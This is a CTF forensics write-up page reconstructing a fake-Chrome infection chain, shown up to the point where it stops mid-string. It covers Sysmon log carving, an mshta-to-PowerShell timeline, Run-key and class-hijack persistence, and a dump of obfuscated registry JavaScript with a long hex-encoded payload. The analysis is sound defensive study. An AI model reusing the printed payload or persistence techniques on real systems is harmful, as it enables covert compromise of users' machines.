<!DOCTYPE html><html lang="en" class="no-js"><head>
    
      <meta charset="utf-8">
      <meta name="viewport" content="width=device-width,initial-scale=1">
      
      
      
        <link rel="canonical" href="https://dhicosatria.github.io/ctf/forensics/shikataganai/">
      
      
        <link rel="prev" href="../">
      
      
        <link rel="next" href="../../../labs_simulate/">
      
      
        
      
      
      <link rel="icon" href="../../../assets/images/favicon.png">
      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.7.1">
    
    
      
        <title>From Fake Chrome to Shikata Shellcode: Rebuilding a Multi-Stage Infection Step by Step - Rubberdust Notes</title>
      
    
    
      <link rel="stylesheet" href="../../../assets/stylesheets/main.484c7ddc.min.css">
      
        
        <link rel="stylesheet" href="../../../assets/stylesheets/palette.ab4e12ef.min.css">
      
      


    
    
      
    
    
      
        
        
        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&amp;display=fallback">
        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
      
    
    
      <link rel="stylesheet" href="../../../styles/extra.css">
    
      <link rel="stylesheet" href="../../../assets/document_dates/fonts/material-icons.css">
    
      <link rel="stylesheet" href="../../../assets/document_dates/tippy/light.css">
    
      <link rel="stylesheet" href="../../../assets/document_dates/tippy/material.css">
    
      <link rel="stylesheet" href="../../../assets/document_dates/tippy/backdrop.css">
    
      <link rel="stylesheet" href="../../../assets/document_dates/tippy/shift-away.css">
    
      <link rel="stylesheet" href="../../../assets/document_dates/tippy/scale.css">
    
      <link rel="stylesheet" href="../../../assets/document_dates/tippy/tippy.css">
    
      <link rel="stylesheet" href="../../../assets/document_dates/core/core.css">
    
      <link rel="stylesheet" href="../../../assets/document_dates/user.config.css">
    
    <script>__md_scope=new URL("../../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
    
      

    
    
  <link href="../../../assets/stylesheets/glightbox.min.css" rel="stylesheet"><script src="../../../assets/javascripts/glightbox.min.js"></script><style id="glightbox-style">
            html.glightbox-open { overflow: initial; height: 100%; }
            .gslide-title { margin-top: 0px; user-select: text; }
            .gslide-desc { color: #666; user-select: text; }
            .gslide-image img { background: white; }
            .gscrollbar-fixer { padding-right: 15px; }
            .gdesc-inner { font-size: 0.75rem; }
            body[data-md-color-scheme="slate"] .gdesc-inner { background: var(--md-default-bg-color); }
            body[data-md-color-scheme="slate"] .gslide-title { color: var(--md-default-fg-color); }
            body[data-md-color-scheme="slate"] .gslide-desc { color: var(--md-default-fg-color); }
        </style></head>
  
  
    
    
      
    
    
    
    
    <body dir="ltr" data-md-color-scheme="default" data-md-color-primary="indigo" data-md-color-accent="indigo">
  
    
    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
    <label class="md-overlay" for="__drawer"></label>
    <div data-md-component="skip">
      
        
        <a href="#from-fake-chrome-to-shikata-shellcode-rebuilding-a-multi-stage-infection-step-by-step" class="md-skip">
          Skip to content
        </a>
      
    </div>
    <div data-md-component="announce">
      
    </div>
    
    
      

<header class="md-header" data-md-component="header">
  <nav class="md-header__inner md-grid" aria-label="Header">
    <a href="../../.." title="Rubberdust Notes" class="md-header__button md-logo" aria-label="Rubberdust Notes" data-md-component="logo">
      
  
  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"></path></svg>

    </a>
    <label class="md-header__button md-icon" for="__drawer">
      
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"></path></svg>
    </label>
    <div class="md-header__title" data-md-component="header-title">
      <div class="md-header__ellipsis">
        <div class="md-header__topic">
          <span class="md-ellipsis">
            Rubberdust Notes
          </span>
        </div>
        <div class="md-header__topic" data-md-component="header-topic">
          <span class="md-ellipsis">
            
              From Fake Chrome to Shikata Shellcode: Rebuilding a Multi-Stage Infection Step by Step
            
          </span>
        </div>
      </div>
    </div>
    
      
        <form class="md-header__option" data-md-component="palette">
  
    
    
    
    <input class="md-option" data-md-color-media="(prefers-color-scheme: light)" data-md-color-scheme="default" data-md-color-primary="indigo" data-md-color-accent="indigo" aria-label="Switch to dark mode" type="radio" name="__palette" id="__palette_0">
    
      <label class="md-header__button md-icon" title="Switch to dark mode" for="__palette_1" hidden>
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="m17.75 4.09-2.53 1.94.91 3.06-2.63-1.81-2.63 1.81.91-3.06-2.53-1.94L12.44 4l1.06-3 1.06 3zm3.5 6.91-1.64 1.25.59 1.98-1.7-1.17-1.7 1.17.59-1.98L15.75 11l2.06-.05L18.5 9l.69 1.95zm-2.28 4.95c.83-.08 1.72 1.1 1.19 1.85-.32.45-.66.87-1.08 1.27C15.17 23 8.84 23 4.94 19.07c-3.91-3.9-3.91-10.24 0-14.14.4-.4.82-.76 1.27-1.08.75-.53 1.93.36 1.85 1.19-.27 2.86.69 5.83 2.89 8.02a9.96 9.96 0 0 0 8.02 2.89m-1.64 2.02a12.08 12.08 0 0 1-7.8-3.47c-2.17-2.19-3.33-5-3.49-7.82-2.81 3.14-2.7 7.96.31 10.98 3.02 3.01 7.84 3.12 10.98.31"></path></svg>
      </label>
    
  
    
    
    
    <input class="md-option" data-md-color-media="(prefers-color-scheme: dark)" data-md-color-scheme="slate" data-md-color-primary="indigo" data-md-color-accent="indigo" aria-label="Switch to light mode" type="radio" name="__palette" id="__palette_1">
    
      <label class="md-header__button md-icon" title="Switch to light mode" for="__palette_0" hidden>
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 7a5 5 0 0 1 5 5 5 5 0 0 1-5 5 5 5 0 0 1-5-5 5 5 0 0 1 5-5m0 2a3 3 0 0 0-3 3 3 3 0 0 0 3 3 3 3 0 0 0 3-3 3 3 0 0 0-3-3m0-7 2.39 3.42C13.65 5.15 12.84 5 12 5s-1.65.15-2.39.42zM3.34 7l4.16-.35A7.2 7.2 0 0 0 5.94 8.5c-.44.74-.69 1.5-.83 2.29zm.02 10 1.76-3.77a7.131 7.131 0 0 0 2.38 4.14zM20.65 7l-1.77 3.79a7.02 7.02 0 0 0-2.38-4.15zm-.01 10-4.14.36c.59-.51 1.12-1.14 1.54-1.86.42-.73.69-1.5.83-2.29zM12 22l-2.41-3.44c.74.27 1.55.44 2.41.44.82 0 1.63-.17 2.37-.44z"></path></svg>
      </label>
    
  
</form>
      
    
    
      <script>var palette=__md_get("__palette");if(palette&&palette.color){if("(prefers-color-scheme)"===palette.color.media){var media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']");palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent")}for(var[key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script>
    
    
    
      
      
        <label class="md-header__button md-icon" for="__search">
          
          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"></path></svg>
        </label>
        <div class="md-search" data-md-component="search" role="dialog">
  <label class="md-search__overlay" for="__search"></label>
  <div class="md-search__inner" role="search">
    <form class="md-search__form" name="search">
      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
      <label class="md-search__icon md-icon" for="__search">
        
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"></path></svg>
        
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"></path></svg>
      </label>
      <nav class="md-search__options" aria-label="Search">
        
        <button type="reset" class="md-search__icon md-icon" title="Clear" aria-label="Clear" tabindex="-1">
          
          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"></path></svg>
        </button>
      </nav>
      
        <div class="md-search__suggest" data-md-component="search-suggest"></div>
      
    </form>
    <div class="md-search__output">
      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix>
        <div class="md-search-result" data-md-component="search-result">
          <div class="md-search-result__meta">
            Initializing search
          </div>
          <ol class="md-search-result__list" role="presentation"></ol>
        </div>
      </div>
    </div>
  </div>
</div>
      
    
    
  </nav>
  
</header>
    
    <div class="md-container" data-md-component="container">
      
      
        
          
            
<nav class="md-tabs" aria-label="Tabs" data-md-component="tabs">
  <div class="md-grid">
    <ul class="md-tabs__list">
      
        
  
  
  
  
    <li class="md-tabs__item">
      <a href="../../.." class="md-tabs__link">
        
  
  
    
  
  Home

      </a>
    </li>
  

      
        
  
  
  
    
  
  
    
    
      <li class="md-tabs__item md-tabs__item--active">
        <a href="../../" class="md-tabs__link">
          
  
  
  CTF

        </a>
      </li>
    
  

      
        
  
  
  
  
    
    
      <li class="md-tabs__item">
        <a href="../../../labs_simulate/" class="md-tabs__link">
          
  
  
  Labs Simulation

        </a>
      </li>
    
  

      
        
  
  
  
  
    
    
      <li class="md-tabs__item">
        <a href="../../../project/" class="md-tabs__link">
          
  
  
  Projects

        </a>
      </li>
    
  

      
        
  
  
  
  
    <li class="md-tabs__item">
      <a href="../../../test/" class="md-tabs__link">
        
  
  
    
  
  Test

      </a>
    </li>
  

      
        
  
  
  
  
    <li class="md-tabs__item">
      <a href="../../../about/" class="md-tabs__link">
        
  
  
    
  
  About

      </a>
    </li>
  

      
    </ul>
  </div>
</nav>
          
        
      
      <main class="md-main" data-md-component="main">
        <div class="md-main__inner md-grid">
          
            
              
              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation">
                <div class="md-sidebar__scrollwrap">
                  <div class="md-sidebar__inner">
                    


  


<nav class="md-nav md-nav--primary md-nav--lifted" aria-label="Navigation" data-md-level="0">
  <label class="md-nav__title" for="__drawer">
    <a href="../../.." title="Rubberdust Notes" class="md-nav__button md-logo" aria-label="Rubberdust Notes" data-md-component="logo">
      
  
  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"></path></svg>

    </a>
    Rubberdust Notes
  </label>
  
  <ul class="md-nav__list" data-md-scrollfix>
    
      
      
  
  
  
  
    <li class="md-nav__item">
      <a href="../../.." class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    Home
  

    
  </span>
  
  

      </a>
    </li>
  

    
      
      
  
  
    
  
  
  
    
    
    
    
      
        
        
      
      
        
      
    
    
      
    
    <li class="md-nav__item md-nav__item--active md-nav__item--section md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2" checked>
        
          
          <label class="md-nav__link" for="__nav_2" id="__nav_2_label" tabindex="">
            
  
  
  <span class="md-ellipsis">
    
  
    CTF
  

    
  </span>
  
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_2_label" aria-expanded="true">
          <label class="md-nav__title" for="__nav_2">
            <span class="md-nav__icon md-icon"></span>
            
  
    CTF
  

          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    Overview
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    
    
    
    
      
      
        
          
          
        
      
    
    
      
    
    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_2">
        
          
          <label class="md-nav__link" for="__nav_2_2" id="__nav_2_2_label" tabindex="">
            
  
  
  <span class="md-ellipsis">
    
  
    Events
  

    
  </span>
  
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_2_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_2_2">
            <span class="md-nav__icon md-icon"></span>
            
  
    Events
  

          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    
    
    
    
      
      
        
      
    
    
      
        
        
      
    
    <li class="md-nav__item md-nav__item--pruned md-nav__item--nested">
      
        
  
  
  
    <a href="../../advent-of-cyber_cyberstudent_2025/" class="md-nav__link">
      
  
  
  <span class="md-ellipsis">
    
  
    Advent of Cyber 2025 (Cyberstudent)
  

    
  </span>
  
  

      
        <span class="md-nav__icon md-icon"></span>
      
    </a>
  

      
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
    
  
  
  
    
    
    
    
      
      
        
          
          
        
      
    
    
      
    
    <li class="md-nav__item md-nav__item--active md-nav__item--section md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_3" checked>
        
          
          <label class="md-nav__link" for="__nav_2_3" id="__nav_2_3_label" tabindex="">
            
  
  
  <span class="md-ellipsis">
    
  
    Categories
  

    
  </span>
  
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_3_label" aria-expanded="true">
          <label class="md-nav__title" for="__nav_2_3">
            <span class="md-nav__icon md-icon"></span>
            
  
    Categories
  

          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
    
  
  
  
    
    
    
    
      
      
        
      
    
    
      
    
    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_3_1" checked>
        
          
          <label class="md-nav__link" for="__nav_2_3_1" id="__nav_2_3_1_label" tabindex="0">
            
  
  
  <span class="md-ellipsis">
    
  
    Forensics
  

    
  </span>
  
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_2_3_1_label" aria-expanded="true">
          <label class="md-nav__title" for="__nav_2_3_1">
            <span class="md-nav__icon md-icon"></span>
            
  
    Forensics
  

          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    List cases
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
    
  
  
  
    <li class="md-nav__item md-nav__item--active">
      
      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
      
      
        
      
      
        <label class="md-nav__link md-nav__link--active" for="__toc">
          
  
  
  <span class="md-ellipsis">
    
  
    From Fake Chrome to Shikata Shellcode: Rebuilding a Multi-Stage Infection Step by Step
  

    
  </span>
  
  

          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <a href="./" class="md-nav__link md-nav__link--active">
        
  
  
  <span class="md-ellipsis">
    
  
    From Fake Chrome to Shikata Shellcode: Rebuilding a Multi-Stage Infection Step by Step
  

    
  </span>
  
  

      </a>
      
        

<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
  
  
  
    
  
  
    <label class="md-nav__title" for="__toc">
      <span class="md-nav__icon md-icon"></span>
      Table of contents
    </label>
    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
      
        <li class="md-nav__item">
  <a href="#investigation" class="md-nav__link">
    <span class="md-ellipsis">
      
        Investigation
      
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#summary" class="md-nav__link">
    <span class="md-ellipsis">
      
        Summary
      
    </span>
  </a>
  
</li>
      
    </ul>
  
</nav>
      
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
      
      
  
  
  
  
    
    
    
    
      
      
        
      
    
    
      
        
        
      
    
    <li class="md-nav__item md-nav__item--pruned md-nav__item--nested">
      
        
  
  
  
    <a href="../../../labs_simulate/" class="md-nav__link">
      
  
  
  <span class="md-ellipsis">
    
  
    Labs Simulation
  

    
  </span>
  
  

      
        <span class="md-nav__icon md-icon"></span>
      
    </a>
  

      
    </li>
  

    
      
      
  
  
  
  
    
    
    
    
      
      
        
      
    
    
      
        
        
      
    
    <li class="md-nav__item md-nav__item--pruned md-nav__item--nested">
      
        
  
  
  
    <a href="../../../project/" class="md-nav__link">
      
  
  
  <span class="md-ellipsis">
    
  
    Projects
  

    
  </span>
  
  

      
        <span class="md-nav__icon md-icon"></span>
      
    </a>
  

      
    </li>
  

    
      
      
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../test/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    Test
  

    
  </span>
  
  

      </a>
    </li>
  

    
      
      
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../about/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    About
  

    
  </span>
  
  

      </a>
    </li>
  

    
  </ul>
</nav>
                  </div>
                </div>
              </div>
            
            
              
              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc">
                <div class="md-sidebar__scrollwrap">
                  <div class="md-sidebar__inner">
                    

<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
  
  
  
    
  
  
    <label class="md-nav__title" for="__toc">
      <span class="md-nav__icon md-icon"></span>
      Table of contents
    </label>
    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
      
        <li class="md-nav__item">
  <a href="#investigation" class="md-nav__link">
    <span class="md-ellipsis">
      
        Investigation
      
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#summary" class="md-nav__link">
    <span class="md-ellipsis">
      
        Summary
      
    </span>
  </a>
  
</li>
      
    </ul>
  
</nav>
                  </div>
                </div>
              </div>
            
          
          
            <div class="md-content" data-md-component="content">
              
                



  


  <nav class="md-path" aria-label="Navigation">
    <ol class="md-path__list">
      
        
  
  
    <li class="md-path__item">
      <a href="../../.." class="md-path__link">
        
  <span class="md-ellipsis">
    Home
  </span>

      </a>
    </li>
  

      
      
        
  
  
    
    
      <li class="md-path__item">
        <a href="../../" class="md-path__link">
          
  <span class="md-ellipsis">
    CTF
  </span>

        </a>
      </li>
    
  

      
        
  
  
    
    
      
  
  
    
    
      <li class="md-path__item">
        <a href="../" class="md-path__link">
          
  <span class="md-ellipsis">
    Categories
  </span>

        </a>
      </li>
    
  

    
  

      
        
  
  
    
    
      <li class="md-path__item">
        <a href="../" class="md-path__link">
          
  <span class="md-ellipsis">
    Forensics
  </span>

        </a>
      </li>
    
  

      
    </ol>
  </nav>

              
              <article class="md-content__inner md-typeset">
                
                  

  <nav class="md-tags">
    
      
      
      
      
        <span class="md-tag">Forensics</span>
      
    
      
      
      
      
        <span class="md-tag">Malware Analysis</span>
      
    
  </nav>



<h1 id="from-fake-chrome-to-shikata-shellcode-rebuilding-a-multi-stage-infection-step-by-step">From Fake Chrome to Shikata Shellcode: Rebuilding a Multi-Stage Infection Step by Step<a class="headerlink" href="#from-fake-chrome-to-shikata-shellcode-rebuilding-a-multi-stage-infection-step-by-step" title="Permanent link">¶</a></h1>
<p>We pulled these <a href="https://drive.google.com/file/d/1jY9ts7WemYzjk_LdsNNAYFqbUg7P9phb/view?usp=sharing">artifacts</a> from a fried workstation. A user downloaded something from a shady site, and shortly after, the machine started lagging and throwing weird popups.</p>
<p><strong>The Task:</strong></p>
<p>I need a full forensic breakdown, covering:</p>
<ul>
<li><strong>Attack Chain:</strong> How did the infection start and what executed?</li>
<li><strong>Persistence:</strong> How is the malware surviving?</li>
<li><strong>The Payload:</strong> Find the final stage and explain exactly what it does.</li>
<li><strong>IOCs:</strong> Relevant IPs, domains, or hashes.</li>
</ul>
<hr>
<h2 id="investigation">Investigation<a class="headerlink" href="#investigation" title="Permanent link">¶</a></h2>
<p>Primary artifacts:</p>
<ul>
<li>NTUSER.DAT (/C/Users/FlagYard/NTUSER.DAT)  - Sysmon EVTX (/C/Windows/System32/winevt/Logs/Microsoft-Windows-Sysmon%254Operational.evtx)</li>
<li>PowerShell Operational EVTX (/C/Windows/System32/winevt/Logs/Microsoft-Windows-PowerShell%254Operational.evtx)</li>
<li>815624.bat (/C/Users/FlagYard/AppData/Local/ce3f5d/815624.bat)</li>
<li>
<p>dcf991.9f2207a (/C/Users/FlagYard/AppData/Local/ce3f5d/dcf991.9f2207a)</p>
</li>
<li>
<p>The attack chain
Run:</p>
</li>
</ul>
<div class="highlight"><pre><span></span><code><span class="nx">strings</span><span class="w"> </span><span class="o">-</span><span class="nx">el</span><span class="w"> </span><span class="o">/</span><span class="nx">C</span><span class="o">/</span><span class="nx">Windows</span><span class="o">/</span><span class="nx">System32</span><span class="o">/</span><span class="nx">winevt</span><span class="o">/</span><span class="nx">Logs</span><span class="o">/</span><span class="nx">Microsoft</span><span class="o">-</span><span class="nx">Windows</span><span class="o">-</span><span class="nx">Sysmon</span><span class="o">%</span><span class="mf">254</span><span class="nx">Operational</span><span class="p">.</span><span class="nx">evtx</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="err">/tmp/sysmon_u16.txt</span>
</code></pre></div>
<p># Initial execution (fake Chrome.exe / PDF- XChange masquerade)
  sed -n '1888,1970p' /tmp/sysmon_u16.txt</p>
<p># mshta reading HKCU\software\99qzf2N\hDF82oB  and spawning powershell
  sed -n '2188,2365p' /tmp/sysmon_u16.txt</p>
<p># Chrome injects regsvr32
  sed -n '6540,6648p' /tmp/sysmon_u16.txt</p>
<p># regsvr32 writes persistence keys
  sed -n '6668,6778p' /tmp/sysmon_u16.txt</p>
<p>We can see:</p>
<ol>
<li>2025-06-03 11:50:34.836 user runs C:\Users\FlagYard\Desktop\Chrome.exe (masquerading as PDF-XChange Viewer).</li>
<li>2025-06-03 11:50:35.894 mshta.exe executes JS reading HKCU\software\99qzf2N\hDF82oB.</li>
<li>2025-06-03 11:50:36.713 PowerShell launch (iex $env:zpztyd).</li>
<li>2025-06-03 11:53:35.699 Chrome injects into regsvr32.exe.</li>
<li>2025-06-03 11:53:38.553 regsvr32 sets class open command to mshta reading HKCU\software\lirs\orhmkbye.</li>
<li>
<p>2025-06-03 11:53:38.568 regsvr32 sets Run key to C:\Users\FlagYard\AppData\Local\ce3f5d\815624.bat.</p>
</li>
<li>
<p>Reproduce persistence artifacts
 Check the startup batch: /C/Users/FlagYard/AppData/Local/ce3f5d/815624.bat</p>
</li>
</ol>
<div class="highlight"><pre><span></span><code><span class="nx">start</span><span class="w"> </span><span class="s2">"nqM1blK1X1LW8QWaOqHEwL"</span><span class="w"> </span><span class="s2">"%LOCALAPPDATA%\ce3f5d\dcf991.9f2207a"</span>
</code></pre></div>
<p>So persistence is:</p>
<ul>
<li>HKCU\Software\Microsoft\Windows\CurrentVersion\Run -&gt; 815624.bat.</li>
<li>
<p>Hijacked class open command -&gt; mshta -&gt; registry JS HKCU\software\lirs\orhmkbye.</p>
</li>
<li>
<p>Extract the registry JS from orhmkbye
Dump the value:</p>
</li>
</ul>
<div class="highlight"><pre><span></span><code><span class="nx">kLvh3rmbAeGborOYXmMcoozk</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"8WCHTDQe8jL96TQ9UrgeBKPjYMKn"</span><span class="p">;</span><span class="w">  </span><span class="nx">YbeMpBSqmJu0xLiiFY</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"UCi8CVAxBsRTPZUEArJ1WniFEMbZhbvZ7bT4TtNqfVfP"</span><span class="p">;</span><span class="w">  </span><span class="nx">E1NADdaQfJCMRCwTvMiHIV</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"31KcBqdvSRicNaGH79Akyjr8VYTqMHS"</span><span class="p">;</span><span class="w">  </span><span class="nx">LvswLlrJn5Q2aBlvcnIgHLN</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"K0saIir59yOVzRGi"</span><span class="p">;</span><span class="w">  </span><span class="nx">gHLNH5sSWpEwHlrvORD</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"amz85ez4LHPAKhIVyklzqYhQZ9ubrfFAUTn"</span><span class="p">;</span><span class="w">  </span><span class="nx">BCRzEWHyiUk3EHeMfIfZ</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"yjplgCEjHnGSb3WiRNG6V8B9EpvVrl3yJxwqz1"</span><span class="p">;</span><span class="w">  </span><span class="nx">NTIAIjOTgFH3acz3CWrlIB</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"NrNz88D8tzLXOSP4Jvj1shdBh2BDxVNWZZecRqvrqEJv6"</span><span class="p">;</span><span class="w">  </span><span class="nx">XAvWazQNjwMDuxXebDRJz9u</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"Z6g02LZ4YxcVVZEH48sHBlnhjcNegycDEh4"</span><span class="p">;</span><span class="w">  </span><span class="nx">Jhp39</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"692745272f1801051c24232568351a524b13301c4406784b71751c18370531120003733016543a0b073d232e7c123a1c595c250316150b58051f0b0b2c753b25534c7a0925351a746c5012293765314d0f141f1d28203203005b26390a33381442106c78541a25240a28201c2923441823144929515d1f0438733a2f5b0a354e5c231f09743a2f011c193e7b335e4c6e0136217618033913644f1346760f650b0030055603460b1c0f003b470c1c7b651e122b75706f6507307135000303217624101508372934332631754f640c44787b401d4b7c353931743f5200782b333b767d120e1f21380511650c3c2e3c5d652e1108730d530d504d5b7c601b1c0017252828212331263b350c0d5f7d1c01302173516555084e534c0642340d5201652f0a2f1f140e440a393c1526040c2957313e063c45205e030028172b3c28564d194d5f521d313b19762b0b0c3a1619161f1e1674002c1434257d3b13131d6b0e021d005b0a354e67141c406a33087b1216060528617e7c110c6f056f432a46200a0b17717f222f0510652a1c126f0c2e5b022f154669136e240275706f6522343c6f0d4c684c104c4709032509111841591c1875015476181d774879565d7f4f6c11141658312a4b261b3f232b5a034814787c715b637045565043562e184f56381347711915253e3d073719242f2a15354a4e673f04160523186b24011c5d5466185f5732107759694e0e7d0748745a4011312056220434036c5063165b2b3039254b794c5e52550a0c4c0707745f106c785438323342470d122037026f27025303030d0234317f4d282a72710d1f233f4c63230b2008136c19255e5a401d313b65755b1c052b1f7105472d637e051d220c18171148220a1618351b6a2b011b2920120c2d2c02143f0c23253a5c0f2403141d3f2e402d284108275f0f3d5d476732002535230b27017f7f4a153c61222f2a150542782d77093203113361071b3e090e3c01073f11125b0b0f0e3d0d79245f0c15077832100d0b792f260325102d223e28497a7176630f3f5547193a2027130d0127567d7539241a7f091803207415782240190c121c01323220406337225727316f0c51090a0633657f053f0507320335032c3567590c3d34011a2619021e616b055a321272010d2a25023d023633546c7414147e092b281925152b6b2e5c2a021c6633082f0c3c7a2d096d35302f2f6760341216013229291430267d1a71033b09192e205c3421161b0d30774c11543c1854680438223319127202697e432e0b234f15321b4e0d344733567a39210e3a3b5232215608227b33111f3571361137611c02505a2325281946053303572524250b1a2f0410203a636d21692636695e01092b212628210f700d7f3e370d5b07231f1576435b05637d31053c1914012e3a40353c0d4224114f44080f1a241b2030030c2b293a2c143059520121100d042207145a375d5a137b173f6b57382d2430470d01565660043232156f015113310a47505766243719633a0a322c036338250813216f037c3a1e0c32651d16363b3e701b1b071636630b0e3101050127303f13557f125a361d6e430d2e2d0e1003170f7a675d0b0a094c1b04023974286454411d381c3b0b17331c147e031d5a1b431014673d683a3a1131015d00321c220e743302661c05233e3f0f2e310320036e3e52556a0e7f3b3378041d2f373476625b19147a541d2936021d2502146d78643c0c2106162c235e06386f47380c2101273b183d1929503d6724021a1f0d212d5b360a221f305e1007251263541e5c082f6266054c2a21212b0b0a596d613b0a3c